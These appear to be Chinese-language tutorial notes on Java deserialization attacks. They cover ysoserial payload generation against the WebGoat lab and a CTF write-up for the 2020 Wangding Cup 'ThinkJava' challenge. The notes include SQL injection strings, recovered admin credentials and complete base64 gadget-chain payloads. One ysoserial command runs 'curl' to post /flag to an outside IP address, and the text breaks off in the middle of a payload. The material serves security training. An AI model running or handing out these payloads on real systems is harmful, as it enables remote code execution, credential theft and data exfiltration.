![1647840348194-b2a85f91-bf45-42ef-98c7-1eac7336afc2.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111634205-1019697812.png)

```plain
#知识点：
1、Java反序列化演示-原生API接口
2、Java反序列化漏洞利用-Ysoserial使用
3、Java反序列化漏洞发现利用点-函数&数据
4、Java反序列化考点-真实&CTF赛题-审计分析
#内容点：
1、明白-Java反序列化原理
2、判断-Java反序列化漏洞
3、学会-Ysoserial工具使用
4、学会-SerializationDumper
5、了解-简要Java代码审计分析

#前置知识:
序列化和反序列化的概念：
序列化：把Java对象转换为字节序列的过程。（对象-->字节流）
反序列化：把字节序列恢复为Java对象的过程。（字节流-->对象）
对象的序列化主要有两种用途：
把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；（持久化对象）
在网络上传送对象的字节序列。（网络传输对象）

函数接口：
Java： Serializable Externalizable接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject等（函数比较多）
PHP： serialize()、 unserialize() 
Python：pickle

数据出现：
1、功能特性：
反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。
2、数据特性：（与PHP有区别）
一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据。
或者如果以aced开头，那么他就是这一段java序列化的16进制。也是初始化数据。
3、出现具体：
http参数，cookie，sesion，存储方式可能是base64(rO0），压缩后的base64(H4s),MII等Servlets http,Sockets,Session管理器，包含的协议就包括：JMX,RMI,JMS,JND1等(\xac\Xed) xm lXstream,XmldEcoder等（http Body:Content-type: application/xml）json(jackson,fastjson)http请求中包含

-发现：
黑盒分析：数据库出现地-观察数据特性
白盒分析：组件安全&函数搜索&功能模块

-利用：
Ysoserial集成的jar包配合生成，特性的专业漏洞利用工具等
```

- 原生API-Ysoserial_URLDNS使用

------

```plain
Serializable 接口
Externalizable 接口
没组件生成DNS利用：

代码：序列化操作
 private static void serialPerson() throws IOException {
        Person person = new Person("xiaodi", 28, "男", 101);

        ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream(new File("d:/person.txt"))
        );
        oos.writeObject(person);
        System.out.println("person 对象序列化成功！");
        oos.close();
    }
    
就是把"xiaodi", 28, "男", 101保存到d:/person.txt中

反序列化操作：
    private static Person deserialPerson() throws Exception {
        ObjectInputStream ois = new ObjectInputStream(
                new FileInputStream(new File("d:/x.txt"))
        );
        Person person = (Person)ois.readObject();
        System.out.println("person 对象反序列化成功！");
        //Runtime.getRuntime().exec("calc.exe");
        return person;
    }
 

序列化的操作结果，生成aced开头的字节流
```

![1647841452055-a239b2ed-fbc1-49f5-9c68-ac566cc2766a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111900114-42175697.png)

```plain
反序列化操作：
```

![1647841655943-ff4b733b-374b-468a-bec1-205d42824d03.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111901036-406704466.png)

```plain
那么这个过程怎么就出现了安全漏洞呢？如果这个时候，这个d:/person.txt如果能够控制的话？如果把这里的内容进行修改，那么就可能造成攻击。
用到工具ysoserial，参考：https://github.com/frohoff/ysoserial
但是这支持的不是所有，这个序列化调用的是原生的接口。如果是外部库的话，需要自己构造。

查看支持的类（需要用java1.8）：java.exe -jar ysoserial-0.0.6-SNAPSHOT-all.jar

后面接的是需要这些包才能运行，这里我们引用的是URLDNS
```

![1647842114086-bcb2b5e7-636d-4d3b-ae28-c6c7bdb19171.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111859883-671602087.png)

```plain
用URLDNS来测试是否能带外访问，来测试这个漏洞是否存在。
java.exe -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://g73ovi.dnslog.cn" > urldns.ser
```

![1647842848568-e6326576-8e4f-48b9-b090-7d700554ae85.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111900432-1934938697.png)

```plain
然后把urldns.ser放在d盘下，然后执行，发生错误但是接受到数据。把原有的序列化数据改成http效果，尝试访问了dnslog这个网站。
这里没有引用外部库，所以只能引用原生的库来引用。
```

- 三方组件-Ysoserial_支持库生成使用

------

```plain
靶场：https://github.com/WebGoat/WebGoat

启动靶场（环境java14）：java.exe -jar webgoat-server-8.1.0.jar --server.port=9999
--server.address=0.0.0.0（支持远程连接）
访问：http://192.168.124.176:9091/WebGoat/login.html 
账号密码：xiaodi123
```

![1647844481582-47689f65-a800-4f1e-bbce-d4dcdaba9874.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111900036-893735498.png)

```plain
发现值：rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l
这是一个base64 反序列化的开端。

可以看他源代码，载入jar包，请求的地址：请求网址: http://192.168.124.176:9091/WebGoat/InsecureDeserialization/task
打开对应的jar包
```

![1647845003754-172ce648-d358-403c-8aae-8f797d23bb49.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111900584-606741843.png)

```plain
含有代码ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64token)));
与上个案例演示的很相似

没有引用外部库，但是引用了别的库，可以对比工具的生成。也要对应版本。
```

![1647845321611-5295b017-aa08-418b-8b4a-53abdd2976eb.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111900778-848277346.png)

```plain
用到这个库来生成payload，因为利用库生成的功能比较多。
有组件生成RCE:
把这个包hibernate-core-5.4.9.Final.jar放在当前目录下
1、生成：java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload Hibernate1 "calc.exe" > x.bin
这个文件生成是aced开头的，然后还需要加密，利用到python进行加密：
2、解码：python java.py
import base64
file = open("x.bin","rb")
now = file.read()
ba = base64.b64encode(now)
print(ba)
file.close()

获得字节流：rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGXHO08ZYmxfcgIADVoAHGNyZWF0ZUVtcHR5Q29tcG9zaXRlc0VuYWJsZWRaABJoYXNOb3ROdWxsUHJvcGVydHlaAAVpc0tleUkADHByb3BlcnR5U3BhbkwAD2NhbkRvRXh0cmFjdGlvbnQAE0xqYXZhL2xhbmcvQm9vbGVhbjtbAAdjYXNjYWRldAAoW0xvcmcvaGliZXJuYXRlL2VuZ2luZS9zcGkvQ2FzY2FkZVN0eWxlO0wAEWNvbXBvbmVudFR1cGxpemVydAAxTG9yZy9oaWJlcm5hdGUvdHVwbGUvY29tcG9uZW50L0NvbXBvbmVudFR1cGxpemVyO0wACmVudGl0eU1vZGV0ABpMb3JnL2hpYmVybmF0ZS9FbnRpdHlNb2RlO1sAC2pvaW5lZEZldGNodAAaW0xvcmcvaGliZXJuYXRlL0ZldGNoTW9kZTtbAA1wcm9wZXJ0eU5hbWVzdAATW0xqYXZhL2xhbmcvU3RyaW5nO1sAE3Byb3BlcnR5TnVsbGFiaWxpdHl0AAJbWlsADXByb3BlcnR5VHlwZXN0ABpbTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO1sAIXByb3BlcnR5VmFsdWVHZW5lcmF0aW9uU3RyYXRlZ2llc3QAJltMb3JnL2hpYmVybmF0ZS90dXBsZS9WYWx1ZUdlbmVyYXRpb247eHIAH29yZy5oaWJlcm5hdGUudHlwZS5BYnN0cmFjdFR5cGXJFpSxstQ41AIAAHhwAAAAAAAAAXBwc3IAM29yZy5oaWJlcm5hdGUudHVwbGUuY29tcG9uZW50LlBvam9Db21wb25lbnRUdXBsaXplcsBwOcjTg59YAgAETAAOY29tcG9uZW50Q2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wACW9wdGltaXplcnQAMExvcmcvaGliZXJuYXRlL2J5dGVjb2RlL3NwaS9SZWZsZWN0aW9uT3B0aW1pemVyO0wADHBhcmVudEdldHRlcnQAKkxvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvR2V0dGVyO0wADHBhcmVudFNldHRlcnQAKkxvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvU2V0dGVyO3hyADdvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5BYnN0cmFjdENvbXBvbmVudFR1cGxpemVy8vZxKVYnaN0CAAVaABJoYXNDdXN0b21BY2Nlc3NvcnNJAAxwcm9wZXJ0eVNwYW5bAAdnZXR0ZXJzdAArW0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvR2V0dGVyO0wADGluc3RhbnRpYXRvcnQAIkxvcmcvaGliZXJuYXRlL3R1cGxlL0luc3RhbnRpYXRvcjtbAAdzZXR0ZXJzdAArW0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvU2V0dGVyO3hwAAAAAAB1cgArW0xvcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyOyaF+ANJPbfPAgAAeHAAAAABc3IAPW9yZy5oaWJlcm5hdGUucHJvcGVydHkuYWNjZXNzLnNwaS5HZXR0ZXJNZXRob2RJbXBsJFNlcmlhbEZvcm2sW7ZWyd0bWAIABEwADmNvbnRhaW5lckNsYXNzcQB+ABNMAA5kZWNsYXJpbmdDbGFzc3EAfgATTAAKbWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wADHByb3BlcnR5TmFtZXEAfgAfeHB2cgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AB9MABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cHEAfgAldAATZ2V0T3V0cHV0UHJvcGVydGllc3QABHRlc3RwcHBwcHBwcHBwdXIAGltMb3JnLmhpYmVybmF0ZS50eXBlLlR5cGU7fq+roeSVYZoCAAB4cAAAAAFxAH4AEXBzcQB+ACEAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAaayv66vgAAADQAOQoAAgADBwAEDAAFAAYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAGPGluaXQ+AQADKClWBwA3AQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAB0BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEBAAxJbm5lckNsYXNzZXMHACcBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQATU3R1YlRyYW5zbGV0UGF5bG9hZAEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAceXNvc2VyaWFsL1B3bmVyNjk3Njk4OTI0NDUwMAEAHkx5c29zZXJpYWwvUHduZXI2OTc2OTg5MjQ0NTAwOwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA4AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA4AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA4AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAjAAAAAgAkACUAAAAKAAEABwAmACgACXVxAH4ALQAAAdTK/rq+AAAANAAbCgACAAMHAAQMAAUABgEAEGphdmEvbGFuZy9PYmplY3QBAAY8aW5pdD4BAAMoKVYHAAgBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwcACgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAGQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAANGb28AIQAHAAIAAQAJAAEAGgALAAwAAQANAAAAAgAOAAEAAQAFAAYAAQAQAAAALwABAAEAAAAFKrcAAbEAAAACABEAAAAGAAEAAAA8ABIAAAAMAAEAAAAFABMAFAAAAAIAFQAAAAIAFgAXAAAACgABAAcAGAAaAAlwdAAEUHducnB3AQB4cQB+AAVzcQB+AAJxAH4AEXEAfgAqcQB+ADF4

但是没有进行弹出 不清楚原因。
如果不利用jar包，生成URLDNS的自带的
生成：java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://z2lyf3.dnslog.cn" > urldns.ser

加密：rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAEHoybHlmMy5kbnNsb2cuY250AABxAH4ABXQABGh0dHBweHQAF2h0dHA6Ly96Mmx5ZjMuZG5zbG9nLmNueA==

接受到数据。原生态的功能比较少，外部库功能比较多。
```

- 解密分析-SerializationDumper数据分析

------

```plain
https://github.com/NickstaDB/SerializationDumper

java14版本运行。
解密分析工具是为了在黑盒或者在代码审计这个漏洞是否存在的时候，经常使用到的这款工具。还有代码是否成功。

比如说刚才生成的payload，生成的urldns.ser，这个代码是会访问dnslog这个地址。这款工具就是能把这个数据还原出来。
```

![1647846847095-f8f068dd-540a-4c05-ba15-32597e0b3570.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111859914-1938577930.png)

```plain
执行：
java -jar SerializationDumper-v1.13.jar -r urldns.ser > a.bin
将文件urldns.ser还原出来保存到a.bin上，就可以看到他原本的东西了。
```

![1647847178981-ca1fda2c-35b2-433d-ace1-97dfef5f4fe0.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111900108-1592085633.png)

- CTF赛题-[网鼎杯2020朱雀组]ThinkJava

------

```plain
打开靶场https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Think%20Java

下载源码，分析源码：发现SQL注入：                String sql = "Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '" + dbName + "' and table_name='" + TableName + "';";

如果采用预编译这个是不会产生SQL注入的                String sql = "Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '" + dbName + "' and table_name='" + TableName + "';";
触发地址是："/sqlDict"
0x01 注入判断，获取管理员帐号密码：
根据提示附件进行javaweb代码审计，发现可能存在注入漏洞
另外有swagger开发接口，测试注入漏洞及访问接口进行调用测试
数据库名：myapp,列名name,pwd
注入测试：
POST /common/test/sqlDict
dbName=myapp?a=' union select (select name from user)#
dbName=myapp?a=' union select (select pwd from user)#

账号admin  密码：admin@Rrrr_ctf_asde
发现引用包：swagger（相当于phpmyadmin一样）一个测试接口

0x02 接口测试
/swagger-ui.html接口测试：
{
"password":"admin@Rrrr_ctf_asde",
  "username": "admin"
}
登录成功返回数据：
{   "data": "Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu",   "msg": "登录成功",   "status": 2,   "timestamps": 1617614357281 }
```

![1647848844985-186b61c4-7e53-4918-916a-1fe1d838370c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111901093-1868849644.png)

```plain
判断是否存在漏洞，有个验证漏洞的地方，把data的值放在里面测试，返回admin
```

![1647849131537-93389688-c24d-4ecf-9bbe-8cc032ff5662.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111900511-252065220.png)

```plain
0x03 回显数据分析攻击思路
JAVAWEB特征可以作为序列化的标志参考:
一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据。
或者如果以aced开头，那么他就是这一段java序列化的16进制。
分析数据：
先利用py2脚本base64解密数据
import base64
a = "rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu"
b = base64.b64decode(a).encode('hex')
print(b)


用python2去运行，得到：aced000573720018636e2e6162632e636f72652e6d6f64656c2e55736572566f764643317b04f43a0200024c000269647400104c6a6176612f6c616e672f4c6f6e673b4c00046e616d657400124c6a6176612f6c616e672f537472696e673b78707372000e6a6176612e6c616e672e4c6f6e673b8be490cc8f23df0200014a000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000000000000174000561646d696e
再利用SerializationDumper解析数据 java反序列化字节转字符串工具
java -jar SerializationDumper-v1.11.jar aced000573720018636e2e6162632e636f72652e6d6f64656c2e55736572566f764643317b04f43a0200024c000269647400104c6a6176612f6c616e672f4c6f6e673b4c00046e616d657400124c6a6176612f6c616e672f537472696e673b78707372000e6a6176612e6c616e672e4c6f6e673b8be490cc8f23df0200014a000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000000000000174000561646d696e
```

![1647850336488-7ad44a3b-1c1e-451f-9d2c-10c5bcc40176.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111900635-300902203.png)

```plain
先生成能访问dnslog这个的payload：java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://am6k4e.dnslog.cn" > urldns.ser
进行加密base64：rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAEGFtNms0ZS5kbnNsb2cuY250AABxAH4ABXQABGh0dHBweHQAF2h0dHA6Ly9hbTZrNGUuZG5zbG9nLmNueA==

进行访问，可以接受。
```

![1647849638074-5220bdaf-b7eb-415a-9bb5-15100ca9d4c6.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913111900528-1723913332.png)

```plain
0x04 生成反序列化payload
解密后数据中包含帐号等信息，通过接口/common/user/current分析可知数据有接受，说明存在反序列化操作，思路：将恶意代码进行序列化后进行后续操作
利用ysoserial进行序列化生成
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME "curl http://47.100.167.248:1111/ -d @/flag" > flag.bin
利用py2脚本进行反序列化数据的提取
import base64
file = open("flag.bin","rb")
now = file.read()
ba = base64.b64encode(now)
print(ba)
file.close()


得到base64得到结果：
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAa+yv66vgAAADQAOQoAAgADBwAEDAAFAAYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAGPGluaXQ+AQADKClWBwA3AQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAB0BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEBAAxJbm5lckNsYXNzZXMHACcBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQATU3R1YlRyYW5zbGV0UGF5bG9hZAEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAKmN1cmwgaHR0cDovLzQ3LjEwMC4xNjcuMjQ4OjExMTEvIC1kIEAvZmxhZwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjExMDkyOTk3MjI5MzAwAQAfTHlzb3NlcmlhbC9Qd25lcjExMDkyOTk3MjI5MzAwOwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA4AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA4AAAAAAABABcAGAABAAAAA